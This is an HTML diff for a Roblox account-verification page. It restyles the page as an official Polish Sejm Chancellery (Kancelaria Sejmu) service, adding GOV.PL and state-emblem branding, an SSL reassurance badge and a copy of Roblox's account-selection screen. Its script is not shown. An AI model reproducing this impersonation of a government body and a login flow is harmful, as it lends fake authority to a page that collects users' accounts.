@@ -2,32 +2,73 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <title>Warszawa Weryfikacja</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weryfikacja Tożsamości | Kancelaria Sejmu RP</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="auth-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_with_gradient.svg" width="60">
-        <h2>Select Account to Continue to Warszawa Weryfikacja</h2>
-        
-        <p style="color: #ccc; font-size: 14px;">Kliknij poniżej, aby bezpiecznie zweryfikować swoje konto.</p>
-        
-        <button id="loginBtn" class="continue-btn">Continue</button>
-        
-        <div class="footer">
-            ©2026 Roblox Corporation. Roblox, the Roblox logo...
+
+    <div class="gov-header">
+        <div class="gov-container">
+            <img src="https://polska.pl/static/img/logo-gov.svg" alt="GOV.PL" class="gov-logo">
+            <span class="gov-text">Serwis Rzeczypospolitej Polskiej</span>
         </div>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const token = urlParams.get('token');
+    <div class="main-wrapper">
+        <div class="auth-container">
+            <div class="sejm-branding">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Herb_Polski.svg/1200px-Herb_Polski.svg.png" alt="Godło Polski" class="eagle">
+                <h1>Kancelaria Sejmu</h1>
+                <p class="department">Biuro Informatyki i Telekomunikacji</p>
+            </div>
 
-        document.getElementById('loginBtn').addEventListener('click', () => {
-            // Przekierowanie do oficjalnego logowania Roblox
-            // Musisz wygenerować ten link w API lub wpisać go na sztywno z Twoim ClientID
-            window.location.href = `/api/roblox-auth?token=${token}`;
-        });
-    </script>
+            <div class="divider-heavy"></div>
+
+            <div class="roblox-auth-ui">
+                <div class="roblox-header">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_with_gradient.svg" alt="Roblox">
+                    <h2>Select Account to Continue to Warszawa Weryfikacja</h2>
+                </div>
+
+                <div class="user-preview">
+                    <p class="logged-as">You're logged in as</p>
+                    <div class="avatar-wrapper">
+                        <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7509A6DA95796A51239F903A3D2F1710-Png/150/150/AvatarHeadshot/WebP/noFilter" id="userAvatar" class="avatar-img">
+                    </div>
+                    <div class="username" id="displayNick">Ładowanie danych...</div>
+                </div>
+
+                <button class="continue-btn" id="verifyBtn">Continue</button>
+
+                <div class="or-divider">
+                    <span>or</span>
+                </div>
+
+                <button class="change-account-btn" onclick="window.location.reload()">Change Account</button>
+            </div>
+
+            <div class="security-info">
+                <img src="https://img.icons8.com/ios-filled/50/ffffff/shield.png" width="16">
+                <span>Połączenie szyfrowane protokołem SSL/TLS</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">O Kancelarii</a>
+                <a href="#">BIP</a>
+                <a href="#">Polityka Prywatności</a>
+                <a href="#">Kontakt</a>
+                <a href="#">Accessibility</a>
+            </div>
+            <p class="legal-text">
+                © 2026 Kancelaria Sejmu. Wszystkie prawa zastrzeżone.<br>
+                Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+            </p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
